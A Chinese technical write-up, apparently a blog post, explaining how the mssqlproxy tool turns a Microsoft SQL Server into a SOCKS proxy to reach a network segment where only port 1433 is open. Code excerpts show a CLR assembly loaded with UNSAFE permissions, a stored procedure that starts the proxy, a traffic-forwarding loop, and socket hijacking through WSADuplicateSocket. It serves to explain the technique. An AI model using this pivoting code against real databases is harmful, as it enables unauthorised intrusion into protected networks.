###  mssqlproxy实现



介绍了如何利用mssqlclient通过mssql作为socks代理，打通只开放1433端口的隔离网段。本文介绍其技术原理以及如何实现。

#### 0x00 本地代理端

首先，利用impacket套件的tds.py处理mssql登录过程（[TDS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec)，表格数据流协议，是一种数据库服务器和客户端间交互的应用层协议，
为微软SQL Server数据库和Sybase公司数据库产品所采用）。在登录之前返回了连接数据库的套接字对象

```Python
    def connect(self):
        af, socktype, proto, canonname, sa = socket.getaddrinfo(self.server, self.port, 0, socket.SOCK_STREAM)[0]
        
        sock = socket.socket(af, socktype, proto)
        
        try:
            sock.connect(sa)
        except Exception:
            #import traceback
            #traceback.print_exc()
            raise
        
        self.socket = sock
        return sock
```

后续本地的socks5流量便通过此sock通过1433端口发送到数据库服务器。

接着，开启clr，注册存储过程Microsoft.SqlServer.Proxy，以此启动数据库代理功能。

```python
mssql.batch("USE msdb; CREATE ASSEMBLY [%s] FROM 0x%s WITH PERMISSION_SET = UNSAFE" % (ASSEMBLY_NAME, data))
res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
if res == 1:
     logging.info("Assembly successfully installed")
            
     mssql.batch("CREATE PROCEDURE [dbo].[%s]"
                        " @path NVARCHAR (4000), @client_addr NVARCHAR (4000), @client_port INTEGER"
                        " AS EXTERNAL NAME [%s].[StoredProcedures].[sp_start_proxy]" % (PROCEDURE_NAME, ASSEMBLY_NAME))
```

把socks服务端处理逻辑(reciclador.dll)上传到数据库服务器，并通过存储过程启动之。

```python
    try:
        #mssql.batch("DECLARE @ip varchar(15); SET @ip=TRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address')));"
        #            "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
        mssql.batch("DECLARE @ip varchar(15); SET @ip=RTRIM(LTRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address'))))"
                    "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
        data = mssql.socket.recv(2048)
        if 'Powered by blackarrow.net' in data:
            logging.info("ACK from server!")
            mssql.socket.sendall("ACK")
        else:
            logging.error("cannot establish connection")
            raise Exception('cannot establish connection')

        s.listen(10)
        while True:
            client, c = s.accept()
            thread.start_new_thread(proxy_worker, (mssql.socket, client))

```

这里的CONNECTIONPROPERTY为mssql内置函数，可获得数据库连接信息，此处返回客户端ip地址。之后，将客户端IP和客户端端口lport传入到reciclador.dll。reciclador返回"Powered by blackarrow.net"表示连接建立。之后，启动转发线程。在本地建立一个socket，监听1337端口，中转proxychains发送给数据库连接socket，再发送到数据库服务器。

```python
    while True:

        readable, writable, errfds = select.select([client, server], [], [], 60)

        for sock in readable:
            if sock is client:
                data = client.recv(2048)
                if len(data) == 0:
                    logging.info("Client disconnected!")
                    logging.debug("Sending end-of-tranmission")
                    server.sendall(MSG_END_OF_TRANSIMISSION)
                    return

                logging.debug("Client: %s" % data.encode('hex'))
                server.sendall(data)

            elif sock is server:
                data = server.recv(2048)
                if len(data) == 0:
                    logging.info("Server disconnected!")
                    return

                logging.debug("Server: %s" % data.encode('hex'))
                client.sendall(data)
```

Select.select实现了I/O复用，当client或者server套接字收到数据时，线程唤醒，转发数据。

#### 0x02 数据库代理端

数据库代理端主要是recicaldor进行逻辑处理，共享客户端连接数据库服务器的socket套接字。

首先，遍历系统中存在的套接字，并通过客户端ip和端口进行匹配，找到客户端套接字对象

```python
	int i;
	int len;
	struct sockaddr_in sockaddr;
	char ipbuf[INET_ADDRSTRLEN];

	WSAStartup(MAKEWORD(2, 0), &wsaData);

	int max_socket = 65536;
	int target = 0;

	// Iterate over all sockets
	for (i = 1; i < max_socket; i++) { 
		len = sizeof(sockaddr);

		// Check if it is a socket
		if (getpeername((SOCKET)i, (SOCKADDR*)&sockaddr, &len) == 0) {
			if (strcmp(inet_ntoa(sockaddr.sin_addr), client_addr) == 0 && (client_port == 0 || sockaddr.sin_port == htons(client_port))) {
				target = i;
				break;
			}
		}
	}
```

接着，使用[WSADuplicateSocket](https://docs.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-wsaduplicatesocketa?redirectedfrom=MSDN)共享该套接字。对要共享的socket调用WSADuplicateSocket，将返回的WSAPROTOCOL_INFO结构体传递给目标进程，然后目标进程用这个结构体调用WSASocket创建一个新的socket描述符，这个socket即指向原来的socket。每次生成的WSAPROTOCOL_INFO结构只能用于创建一次共享socket。另外就是Windows并没有对共享socket有IO访问控制的机制，这意味这如果在新的socket上调用recv，那么原程序就没法再recv了；如果两个程序同时调用了send而没有执行同步机制，那么send的数据也将会是乱掉的。

```C++
		SOCKET dup = INVALID_SOCKET;
		WSAPROTOCOL_INFO sockstate;
		if (WSADuplicateSocket(target, GetCurrentProcessId(), &sockstate) == 0)
		{
			dup = WSASocket(FROM_PROTOCOL_INFO, FROM_PROTOCOL_INFO, FROM_PROTOCOL_INFO, &sockstate, 0, 0);
		}

		if (dup == INVALID_SOCKET) {
			return -1; // exit :(
		}

```

最后，便是利用共享的套接字转发处理socks5流量。